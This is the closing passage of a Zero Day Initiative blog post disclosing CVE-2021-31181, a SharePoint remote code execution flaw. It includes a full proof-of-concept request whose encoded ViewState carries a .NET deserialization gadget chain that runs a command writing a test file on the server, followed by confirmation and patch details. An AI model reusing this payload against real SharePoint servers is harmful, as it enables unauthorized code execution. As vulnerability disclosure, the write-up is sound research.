          <td id="file-cve-2021-31181-snippet-7-console-LC1" class="blob-code blob-code-inner js-file-line">http://sp2019/sites/ts01/_layouts/15/success.aspx?__VIEWSTATE=%2FwEy3AcAAQAAAP%2F%2F%2F%2F8BAAAAAAAAAAwCAAAABlN5c3RlbQUBAAAAQFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLG1zY29ybGliXV0EAAAABUNvdW50CENvbXBhcmVyB1ZlcnNpb24FSXRlbXMAAQABCAgCAAAAAgAAAAkDAAAAAAAAAAkEAAAABAMAAABAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuQ29tcGFyaXNvbkNvbXBhcmVyYDFbW1N5c3RlbS5TdHJpbmddXQEAAAALX2NvbXBhcmlzb24BCQUAAAARBAAAAAIAAAAGBgAAAC0vYyBlY2hvIFJDRSA%2BIGM6L3dpbmRvd3MvdGVtcC9Qb0NfU1BSQ0UwMS50eHQGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQABeAEBAQkIAAAADQANAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQASdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAQEBAQEGCwAAAJIBU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZ10sW1N5c3RlbS5TdHJpbmddLFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyxTeXN0ZW0sVmVyc2lvbj00LjAuMC4wLEN1bHR1cmU9bmV1dHJhbCxQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GDAAAAAhtc2NvcmxpYg0ABg0AAABGU3lzdGVtLFZlcnNpb249NC4wLjAuMCxDdWx0dXJlPW5ldXRyYWwsUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYOAAAAGlN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzBg8AAAAFU3RhcnQJEAAAAAQJAAAAAXgHAAAAAAAAAAAAAAEBAQEBAAEIDQANAA0ADQANAAAAAAABCgAAAAkAAAAGFgAAAAdDb21wYXJlDQAGGAAAAA1TeXN0ZW0uU3RyaW5nDQANAAAAAAANAAEQAAAACAAAAAYbAAAAJFN5c3RlbS5Db21wYXJpc29uYDFbW1N5c3RlbS5TdHJpbmddXQkMAAAADQAJDAAAAAkYAAAACRYAAAALhqX97I%2FUpin%2FLFY1lHJk6pjbx4nmnEzAF9w7RTqd6co%3D</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/zdi-team/dfecdc33528355538912bfd620cd63e3/raw/92e5df265b0c6dd735931478cd671bbf7c9ac4c6/CVE-2021-31181-snippet-7.console" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/zdi-team/dfecdc33528355538912bfd620cd63e3#file-cve-2021-31181-snippet-7-console" class="Link--inTextBlock">
          CVE-2021-31181-snippet-7.console
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_137013"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Browsing to this URL, an error page is returned.</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_137550"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_287">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_286">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_285">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_284">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_283">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:30.341880798339844%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_282">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png" data-image-dimensions="468x142" data-image-focal-point="0.5,0.5" alt="Picture14.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture14.png" width="468" height="142" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647795235-II08MKI9BWA5YYZC19R7/Picture14.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block markdown-block sqs-block-markdown" data-block-type="44" id="block-yui_3_17_2_1_1622577090871_138929"><div class="sqs-block-content"><p>However, when we check the <code>C:\Windows\temp</code> folder on the SharePoint server:</p>

</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1622577090871_139883"><div class="sqs-block-content" id="yui_3_17_2_1_1762949685278_303">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949685278_302">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:468px;" id="yui_3_17_2_1_1762949685278_301">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949685278_300">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949685278_299">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:32.905982971191406%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949685278_298">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png" data-image-dimensions="468x154" data-image-focal-point="0.5,0.5" alt="Picture15.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/Picture15.png" width="468" height="154" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1622647831445-C154VTU0N7DNODPBFFPH/Picture15.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1622577090871_141254"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Our target file was successfully created, demonstrating that we achieved code execution. In the same way, an attacker can execute any OS command in the context of the SharePoint web application.</p><p class="" style="white-space:pre-wrap;"><strong>Conclusion</strong></p><p class="" style="white-space:pre-wrap;">Microsoft patched this in May and assigned identifier CVE-2021-31181, with a CVSS score of 8.8. SharePoint continues to be an attractive target for researchers and attackers alike, and several SharePoint-related disclosures are currently in our <a href="https://www.zerodayinitiative.com/advisories/upcoming/">Upcoming</a> queue. Stay tuned to this blog for details about those bugs once they are disclosed.</p><p class="" style="white-space:pre-wrap;">Until then, follow the <a href="https://twitter.com/thezdi" target="_blank">team</a> for the latest in exploit techniques and security patches.</p>
</div>






















</div></div></div></div></div>
                            </div>

                            <!--TAGS-->
                            <ul class="blog-tags">
                            
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/Microsoft">Microsoft</a></li>
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/SharePoint">SharePoint</a></li>
                                
                                    <li><a href="https://www.zerodayinitiative.com/blog/tag/Research">Research</a></li>
                                
                            
                            </ul>
                        </div>
                        
                    </div><!-- /. contentBlock -->
                </div>

        </div>
    </div>

<div id="footer" style="padding: 0px">
    <div id="footerContact">
        <div class="content">
            <div class="footerContactBox">
                <h3>General Inquiries</h3>
                <a href="mailto:zdi@trendmicro.com">zdi@trendmicro.com</a>
            </div>
            <div class="footerContactBox">
                <h3>Find us on X</h3>
                <a href="https://twitter.com/thezdi">@thezdi</a>
            </div>
            <div class="footerContactBox">
                <h3>Find us on Mastodon</h3>
                <a rel="me" href="https://infosec.exchange/@thezdi">Mastodon</a>
            </div>
            <div class="footerContactBox">
                <h3>Media Inquiries</h3>
                <a href="mailto:media_relations@trendmicro.com">media_relations@trendmicro.com</a>
            </div>
            <div class="footerContactBox">
                <h3>Sensitive Email Communications</h3>
                <a href="https://www.zerodayinitiative.com/documents/zdi-pgp-key.asc" target="_blank">PGP Key</a>
            </div>
        </div>
    </div>

    <div id="footerMenu">
        <div id="footerMiddleSection" class="group">
            <div id="footerLinks">
                <div class="content">
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/about/" class="footerTitleLink">WHO WE ARE</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/about/">Our Mission</a></li>

                            <li><a href="https://www.trendmicro.com/">Trend Micro</a></li>
                            <li>
                                <a href="https://www.trendmicro.com/en_us/business/products/network/integrated-atp/next-gen-intrusion-prevention-system.html">TippingPoint
                                    IPS</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/about/benefits/" class="footerTitleLink">HOW IT WORKS</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/about/benefits/#process">Process</a></li>
                            <li><a href="https://www.zerodayinitiative.com/about/benefits/#researcher-rewards">Researcher Rewards</a></li>
                            <li><a href="https://www.zerodayinitiative.com/about/faq/">FAQS</a></li>
                            <li><a href="https://www.trendmicro.com/privacy/">Privacy</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/advisories" class="footerTitleLink">ADVISORIES</a>
                        <ul>
                            <li><a href="https://www.zerodayinitiative.com/advisories/published">Published Advisories</a></li>
                            <li><a href="https://www.zerodayinitiative.com/advisories/upcoming">Upcoming Advisories</a></li>
                            <li><a href="https://www.zerodayinitiative.com/rss">RSS Feeds</a></li>
                        </ul>
                    </div>
                    <div class="footerLinkBox">
                        <a href="https://www.zerodayinitiative.com/blog" class="footerTitleLink">BLOG</a>
                    </div>

                    <div class="footerLogo">
                        <a href="https://www.zerodayinitiative.com/"><img src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/logo-scarab.svg" alt="thezdi"></a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>var baseURL = ""</script>
<script src="./Zero Day Initiative — CVE-2021-31181_ Microsoft SharePoint WebPart Interpretation Conflict Remote Code Execution Vulnerability_files/main.js.download"></script>

<script data-sqs-type="imageloader-bootstrapper">if(window.ImageLoader) window.ImageLoader.bootstrap({}, document);</script><script>Squarespace.afterBodyLoad(Y);</script><svg xmlns="http://www.w3.org/2000/svg" version="1.1" style="display:none" data-usage="social-icons-svg"><symbol id="youtube-icon" viewBox="0 0 64 64"><path d="M46.7,26c0,0-0.3-2.1-1.2-3c-1.1-1.2-2.4-1.2-3-1.3C38.3,21.4,32,21.4,32,21.4h0 c0,0-6.3,0-10.5,0.3c-0.6,0.1-1.9,0.1-3,1.3c-0.9,0.9-1.2,3-1.2,3S17,28.4,17,30.9v2.3c0,2.4,0.3,4.9,0.3,4.9s0.3,2.1,1.2,3 c1.1,1.2,2.6,1.2,3.3,1.3c2.4,0.2,10.2,0.3,10.2,0.3s6.3,0,10.5-0.3c0.6-0.1,1.9-0.1,3-1.3c0.9-0.9,1.2-3,1.2-3s0.3-2.4,0.3-4.9 v-2.3C47,28.4,46.7,26,46.7,26z M28.9,35.9l0-8.4l8.1,4.2L28.9,35.9z"></path></symbol><symbol id="youtube-mask" viewBox="0 0 64 64"><path d="M0,0v64h64V0H0z M47,33.1c0,2.4-0.3,4.9-0.3,4.9s-0.3,2.1-1.2,3c-1.1,1.2-2.4,1.2-3,1.3 C38.3,42.5,32,42.6,32,42.6s-7.8-0.1-10.2-0.3c-0.7-0.1-2.2-0.1-3.3-1.3c-0.9-0.9-1.2-3-1.2-3S17,35.6,17,33.1v-2.3 c0-2.4,0.3-4.9,0.3-4.9s0.3-2.1,1.2-3c1.1-1.2,2.4-1.2,3-1.3c4.2-0.3,10.5-0.3,10.5-0.3h0c0,0,6.3,0,10.5,0.3c0.6,0.1,1.9,0.1,3,1.3 c0.9,0.9,1.2,3,1.2,3s0.3,2.4,0.3,4.9V33.1z M28.9,35.9l8.1-4.2l-8.1-4.2L28.9,35.9z"></path></symbol></svg>



</body></html>